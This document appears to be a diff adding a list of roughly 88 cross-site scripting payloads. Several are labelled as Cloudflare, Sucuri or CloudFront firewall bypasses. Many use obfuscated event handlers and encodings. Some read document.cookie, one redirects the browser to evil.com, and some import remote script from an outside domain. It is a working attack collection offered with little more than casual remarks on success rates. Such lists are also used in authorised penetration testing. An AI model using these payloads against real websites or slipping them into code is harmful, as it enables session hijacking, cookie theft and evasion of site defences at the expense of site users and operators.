@@ -1,0 +1,89 @@
+%27"></a></script></titl></form></span></meta></style></iframe></noscript></textarea></xmp></pre><ScrIPt>prompt`rajeev`;>
+
+"/&nvgt;&nvlt;img src=x OnError="alert(0);&nvgt;
+"><svg/onload=alert(1)>
+javascript://%e2%80%a8alert(document.cookie);
+"/><img>/><svg/onload=alert(1)>
+"></\/\<img>/><svg/onload=alert(1)>
+"></\/\</script><script>alert(1)</script>
+"/><img src=x onerror=alert(0)>
+"><script>alert("xss");</script>
+<div onmouseover="alert('XSS');">Hello :) 
+^ [My favorite one - works like 80% of the time for me].
+</style><script>a=eval;b=alert;a(b(/XSS/.source));</script>
+<a href="j&#97;vascript&#x3A;&#97;lert('Sucuri WAF Bypassed ! ' + document.domain + '\nCookie: ' + document.cookie); window&#46;location&#46;href='https://evil.com';">ClickMe</a>
+
+'"<A Autofocus HRef %252f=""OnFocus=top/**/?.['al'%2B'ert'](0)>
+
+cloud flare bypass
+
+"><Svg Only=1 OnLoad=confirm(atob("Q2xvdWRmbGFyZSBYU1MgQG1fa2VsZXBjZQ=="))>
+OnXSS=<Img/Src/OnError=alert(1)>
+<Img Src=OnXSS OnError=alert(1)>
+"*prompt(document.domain)*"
+<img hrEF="0" sRC="data:0," oNLy=1 oNErrOR​=console.log`1`>
+<00 foo="<a%20href="javascript:alert('XSS-Bypass')">XSS-CLick</00>--%20/
+<<TexTArEa/*%00//%00*/a="not"/*%00///AutOFocUs////onFoCUS=alert`1` //
+"><body/oNpagEshoW=(confirm)(document.domain)>
+<svg onload=alert%26%230000000040"")>
+<Svg Only=1 OnLoad=confirm(atob("Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ=="))>  
+"&gt;&lt;Svg Only=1 OnLoad=confirm(atob("Q2xvdWRmbGFyZSBYU1MgQG1fa2VsZXBjZQ=="))&gt;
+<details x=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:2 open ontoggle="prompt(document.cookie);">
+"%2Bself[%2F*foo*%2F'alert'%2F*bar*%2F](self[%2F*foo*%2F'document'%2F*bar*%2F]['domain'])%2F%2F
+<svg onload=alert%26%230000000040"1")>
+"><Svg Only=1 OnLoad=confirm(atob("Q2xvdWRmbGFyZSBYU1MgQG1fa2VsZXBjZQ=="))>
+<A HRef=//X55.is AutoFocus %26%2362 OnFocus%0C=import(href)>
+'<00 foo="<a%20href="javascript:alert('XSS-Bypass')">XSS-CLick</00>--%20/
+<A HRef=//X55.is AutoFocus %26%2362 OnFocus%0C=import(href)>
+<Svg Only=1 OnLoad=confirm(1)>
+<dETAILS%0aopen%0aonToGgle%0a%3d%0aa%3dprompt,a(origin)%20x>
+<Svg Only=1 OnLoad=confirm(atob("Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ=="))>
+"><img src=x onerror=alert(1)>
+"><img src=x onerrora=confirm() onerror=confirm(1)>
+onfocus=alert&#x00000000028;1&#x00000000029; autofocus>
+">%20<img src=o onerror=alert``>//
+"><img src=x onerrora=confirm() onerror=confirm(1)>
+<script>alert()</script>
+%2sscript%2ualert()%2s/script%2u
+"&gt;&lt;Svg Only=1 OnLoad=confirm(atob("Q2xvdWRmbGFyZSBYU1MgQG1fa2VsZXBjZQ=="))&gt;
+"><img%20src=x%20onmouseover=prompt%26%2300000000000000000040;document.cookie%26%2300000000000000000041;
+<h1/%6f%6e/oNclicK=alert`hacked`>CLICK HERE
+`payload´; %3Cimg src='null' onerror=alert('spyerror')%3E 
+"><!'/*"*\'/*\"/*--></Script><Image SrcSet=K */; OnError=confirm(document.domain) //>#
+<a+HREF="%26%237 javascrip%26%239t: alert%261par;document .domain) *> 
+<image/b/src/onerror=globalThis&lsqb;&apos;&#92;u0070rint&apos;&rsqb;&lpar;&rpar;>
+<Svg Only=1 OnLoad=confirm(atob("Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ=="))>
+"><details%20onMouSeover=%0Aabc=(co\u006efirm);abc%28%27xss%27%26%230000000000000000041//>
+<img src=x  oncontentvisibilityautostatechange="confirm(1)">
+<svg on onload=(alert)(document.domain)>
+javascript:var{a:onerror}={a:alert};throw%20document.domain
+<A HRef=//X55.is AutoFocus %26%2362 OnFocus%0C=import(href)>	
+‘>alert(154)</script><script/154=’;;;;;;;
+<Svg%20Only=1%20OnLoad=confirm(atob(%27Q2xvdWRmbGFyZSBieXBhc3NlZA==%27))>
+<svg onload=alert&#0000000040"1")><””>
+<svg%20onx=()%20onload=(confirm)(document.domain)>
+ &#34;&gt;&lt;track/onerror=&#x27;confirm\%601\%60&#x27;&gt;  
+"><track/onerror='confirm`1`'>
+"\/><img%20s+src+c=x%20on+onerror+%20="alert(1)"\
+"%2Bself[%2F*foo*%2F'alert'%2F*bar*%2F](self[%2F*foo*%2F'document'%2F*bar*%2F]['domain'])%2F%2F
+"><div/onclick="(function(){setTimeout(()%20=>%20alert(document.domain),%200);})();">Click%20me!</div>
+\"><img/src=x/onerro=6><img/src=\"1\"/onerror=alert(1);>
+";eval,'a'%2Balert`2+5`%2B"
+"/hrefd=(1%0a%0aoncontentvisibilityautostatechange=confirm(/A00N/)%0d%0astyle=content-visibility:auto
+<button%20popovertarget=x>Click%20me</button><img%20onbeforetoggle=alert(1)%20popover%20id=x>XSS
+<Svg Only=1 OnLoad=confirm(1)>
+"/><svg/svg/svg/On/OnLoAd/=confirm`1`
+<Svg Only=1 OnLoad=confirm(atob("Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ=="))>
+<svg%0Aonauxclick=0;[1].some(confirm)//
+<Svg%20Only=1%20OnLoad=confirm(atob(%27Q2xvdWRmbGFyZSBieXBhc3NlZA==%27))>
+<svg/OnLoad="`${prompt``}`">
+"%2Bself[%2F*foo*%2F'alert'%2F*bar*%2F](self[%2F*foo*%2F'document'%2F*bar*%2F]['domain'])%2F%2F 
+<svg onload=alert&#0000000040document.cookie)>
+">%0D%0A%0D%0A<x '="foo"><x foo='><img src=x onerror=javascript:alert(`cloudfrontbypass`)//'>
+&#34;&gt;&lt;track/onerror=&#x27;confirm\%601\%60&#x27;&gt;
+“><svg/on</script>laod=alert>
+<a href="j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;&lpar;a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;(document.domain)&rpar;">X</a>
+%3CSVG/oNlY=1%20ONlOAD=confirm(document.domain)%3E
+"><<iframe onx=() onload=(alert)(6)>
+{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(1)');}}
+<select><noembed></select><script x='a@b'a> y='a@b'//a@b%0a\u0061lert('CYBERTIX')</script x>
